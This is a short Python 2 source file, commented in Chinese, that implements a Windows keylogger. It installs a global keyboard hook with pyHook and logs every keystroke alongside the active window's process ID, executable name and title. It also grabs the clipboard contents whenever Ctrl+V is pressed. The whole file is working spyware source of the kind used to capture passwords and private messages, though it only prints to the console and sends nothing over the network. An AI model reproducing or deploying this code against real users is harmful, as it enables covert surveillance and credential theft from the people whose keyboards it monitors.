#-*-coding:utf-8-*-
from ctypes import *
import pythoncom
import pyHook
import win32clipboard

user32=windll.user32
kernel32=windll.kernel32
psapi=windll.psapi
current_window=None

def get_current_process():
	#获得最上层的窗口句柄。
	hwnd=user32.GetForegroundWindow()

	#找出某个窗口的创建者（线程或进程），返回创建者的标志符。
	#GetWindowThreadProcessId函数返回创建窗口的线程的id，并将其进程号拷贝到第二个参数处。
	pid=c_ulong(0)
	user32.GetWindowThreadProcessId(hwnd,byref(pid))

	#将进程ID存入变量中。
	process_id='%d' % pid.value

	#申请内存。
	#OpenProcess 函数用来打开一个已存在的进程对象，并返回进程的句柄。
	#GetModuleBaseNameA函数将进程名拷贝到缓冲区。
	executable=create_string_buffer('\x00'*512)
	h_process=kernel32.OpenProcess(0x400 | 0x10,False,pid)
	psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

	#读取窗口标题，GetWindowTextA函数将指定窗口的标题栏（如果有的话）的文字拷贝到缓冲区内。
	windows_title=create_string_buffer('\x00'*512)
	length=user32.GetWindowTextA(hwnd,byref(windows_title),512)

	#打印
	print
	print "[PID: %s-%s-%s]" % (process_id,executable.value,windows_title.value)
	print

	#关闭handles
	kernel32.CloseHandle(hwnd)
	kernel32.CloseHandle(h_process)

#定义击键监听事件函数
def KeyStroke(event):
	global current_window

	#检测目标窗口是否转移，换了其它窗口就监听新的窗口
	if event.WindowName!=current_window:
		current_window=event.WindowName
		#函数调用
		get_current_process()

	#检测击键是否常规按键
	if event.Ascii>32 and event.Ascii<127:
		print chr(event.Ascii)
	else:
		#如果发现Ctrl+v事件，则记录粘贴板内容
		if event.Key=='V':
			win32clipboard.OpenClipboard()
			pasted_value=win32clipboard.GetClipboardData()
			win32clipboard.CloseClipboard()
			print '[PASTE]-%s'%(pasted_value)
		else:
			print '[%s]' % event.Key
	#循环监听下一个击键事件
	return True

#创建并注册hook管理器
kl=pyHook.HookManager()
kl.KeyDown=KeyStroke

#注册hook并执行
kl.HookKeyboard()
pythoncom.PumpMessages()
